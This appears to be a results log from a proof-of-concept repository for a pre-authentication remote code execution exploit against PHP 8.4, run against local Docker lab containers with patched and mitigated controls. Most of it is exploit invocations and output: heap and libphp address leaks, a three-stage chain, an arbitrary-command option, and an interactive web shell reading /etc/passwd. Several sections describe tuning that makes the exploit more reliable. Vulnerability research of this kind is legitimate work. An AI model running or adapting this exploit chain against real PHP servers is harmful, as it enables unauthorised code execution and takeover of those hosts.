# Observed local results — 2026-10-23

All tests were executed from Kali/WSL against Docker services bound only to
`127.0.0.1`. No external target was contacted.

## Passive redirect and terminal-result verification

A temporary loopback HTTP fixture returned `302 /start -> /final`; the final
response exposed `X-Powered-By: PHP/8.4.27`. Check mode followed the same-host
redirect, retained both hops in `http_chain`, and classified only the final
version evidence:

```text
[UPSTREAM_FIXED_VERSION] http://127.0.0.1:18191/start  PHP 8.4.27
HTTP chain:
  302 http://127.0.0.1:18191/start -> /final
  200 http://127.0.0.1:18191/final
```

The PHP 8.4.27 patched control was then run with one bounded attempt per stage.
It produced no proof file and ended with the new explicit negative observation:

```text
FAIL      HEAP_LEAK_FAILED

[-] NO EXECUTION PROOF OBSERVED
    No proof artifact or authenticated target shell was obtained with the selected build profile.
    Verdict: INCONCLUSIVE — this does not prove that the runtime is patched or not vulnerable.
```

The second message is intentionally not `NOT VULNERABLE`: absence of execution
from one build-specific profile cannot establish that broader claim.

## Heap-layout reliability correction

The earlier Compose healthcheck requested `status.php` every three seconds.
Because the fixture deliberately has exactly one persistent prefork worker,
those requests could occur between the exploit's producer and consumer
requests and alter the calibrated heap layout. Server logs from a failed run
showed `GET /status.php` interleaved with the OOM and session requests.

The healthcheck now verifies PID 1 and the port 80 listener through `/proc`
without sending an HTTP or PHP request:

```text
["CMD-SHELL","kill -0 1 && grep -q ':0050 ' /proc/net/tcp"]
```

Three initial clean-container trials completed the full chain on their first
attempt. A later clean boot did not, so those three successes were not treated
as proof of determinism. A bounded diagnostic showed that a bad Apache parent
could repeatedly return only a normal 32–48-byte cookie, or close the response,
without producing candidate heap pointers. Repeating ten times in that parent
did not help.

Two further corrections were applied:

- the local chain now uses `/probe.php`, containing only
  `<?php echo "OK\n"; ?>`, instead of rendering the large corporate `index.php` after request
  parsing at an almost exhausted 8 MiB memory limit; and
- Stage 1 is capped at three attempts and Stage 3 at six attempts per Apache
  parent, after which the script recreates the owned vulnerable container.

A default five-cycle run started on a parent that leaked Stage 1 and Stage 2
but missed Stage 3 six times. The automatic recreate then completed the entire
chain on cycle two:

```text
[*] local exploit cycle 2/5
CHAIN     using /probe.php on the same local website to avoid landing-page heap noise
STAGE 1   heap leak (attempt 1/3)
OK        chunk base = 0x710cc8a00000
STAGE 2   libphp leak (attempt 1/10)
OK        libphp base = 0x710cca769000
STAGE 3   htdata=0x710cc8a690d8  zif=0x710ccabce370
OK        stage 3 attempt 1 succeeded

[+] PRE-AUTH RCE CONFIRMED
PROOF:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@php2shell:/var/www/html$ whoami
www-data
```

The next independent clean-start run completed on cycle one and Stage 3
attempt one with heap base `0x7ebdda000000` and libphp base
`0x7ebddbcce000`. The current container log contained no healthcheck request to
`/status.php`. After each successful shell run, the activation token was
revoked and the endpoint returned HTTP 403 again.

## Target-backed interactive shell

The basic command was run from a real terminal after adding the one-run
post-exploitation console:

```bash
cd ~/php2shell
python3 poc-cve-2026-109618.py -u http://127.0.0.1:8088/index.php --no-color
```

Stage 3 succeeded and the process entered a command prompt served by the
vulnerable website. The following output was observed:

```text
[+] PRE-AUTH RCE CONFIRMED

PROOF:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] TARGET-BACKED WEB SHELL ACTIVE
    endpoint: http://127.0.0.1:8088/shell.php
    identity: www-data

www-data@php2shell:/var/www/html$ whoami
www-data
www-data@php2shell:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@php2shell:/var/www/html$ cat /etc/passwd | head -n 5
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
www-data@php2shell:/var/www/html$ cd /tmp
www-data@php2shell:/tmp$ pwd
/tmp
www-data@php2shell:/tmp$ exit
[+] target-backed shell closed and token revoked
```

Before the exploit, an invalid-token POST to the vulnerable endpoint returned
HTTP 403. The same endpoint remained permanently disabled on the PHP 8.4.27
patched and PHP 8.4.26 mitigated controls. After `exit`, the vulnerable endpoint
again returned HTTP 403. The Docker network was also verified with IP
masquerading disabled, and an outbound HTTP connection from the vulnerable
container failed as expected.

## Verification after repository rename

After moving the complete repository to `/home/zake/php2shell`, the documented
basic command was executed again:

```bash
cd ~/php2shell
python3 poc-cve-2026-109618.py -u http://127.0.0.1:8088/index.php --no-color
```

The renamed path completed the full chain on its first bounded container cycle:

```text
STAGE 1   chunk base = 0x79cce3e00000
STAGE 2   libphp base = 0x79cce5a57000
STAGE 3   htdata=0x79cce3e690d8  zif=0x79cce5ebc370
OK        stage 3 attempt 1 succeeded

[+] PRE-AUTH RCE CONFIRMED

PROOF:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Basic `-u` execution

Executed from the repository root:

```bash
python3 poc-cve-2026-109618.py -u http://127.0.0.1:8088/index.php --no-color
```

The first four bounded fresh-container cycles were inconclusive. Cycle five
completed all three exploit stages:

```text
STAGE 1   chunk base = 0x75f4ba000000
STAGE 2   libphp base = 0x75f4bbbc9000
STAGE 3   htdata=0x75f4ba0690d8  zif=0x75f4bc02e370
OK        stage 3 attempt 1 succeeded

[+] PRE-AUTH RCE CONFIRMED

PROOF:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The proof was independently read from the host-visible `out/p1` file. OOM,
HTTP 500, reset, or heap-corruption text was not used as the success predicate.

## HTTP `--fetch` execution

Executed:

```bash
python3 poc-cve-2026-109618.py \
  -u http://127.0.0.1:8088/index.php \
  -c 'id>p1.txt' \
  --fetch /p1.txt \
  --no-color
```

Cycle two reached Stage 3 and the subsequent HTTP GET returned:

```text
STAGE 1   chunk base = 0x76db9ea00000
STAGE 2   libphp base = 0x76dba05d1000
STAGE 3   htdata=0x76db9ea690d8  zif=0x76dba0a36370
OK        stage 3 attempt 1 succeeded

[+] PRE-AUTH RCE CONFIRMED

PROOF:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The webroot used for this test is a writable disposable copy inside the
container; the tracked `lab/www` source stayed unchanged.

## Negative controls

The patched PHP 8.4.27 control used offsets extracted from its own binary and
the same calibrated profile. It stopped at Stage 1:

```text
PATCHED   PHP 8.4.27 is at or past the branch fix
OFFSETS   zif=0x46ad70  dtor=0x66a620  htdata=0x690d8
STAGE 1   heap leak (attempt 1/2)
MISS      heap leak
STAGE 1   heap leak (attempt 2/2)
MISS      heap leak
FAIL      HEAP_LEAK_FAILED
```

The PHP 8.4.26 mitigation control had `memory_limit=-1` and upload progress
disabled. It also stopped at Stage 1:

```text
OFFSETS   zif=0x465370  dtor=0x65eb60  htdata=0x690d8
STAGE 1   heap leak (attempt 1/2)
MISS      heap leak
STAGE 1   heap leak (attempt 2/2)
MISS      heap leak
FAIL      HEAP_LEAK_FAILED
```

Neither control created its configured proof file. These negative controls are
specific to the demonstrated OOM chain and configuration; they do not claim
that every possible PHP-runtime path is absent.
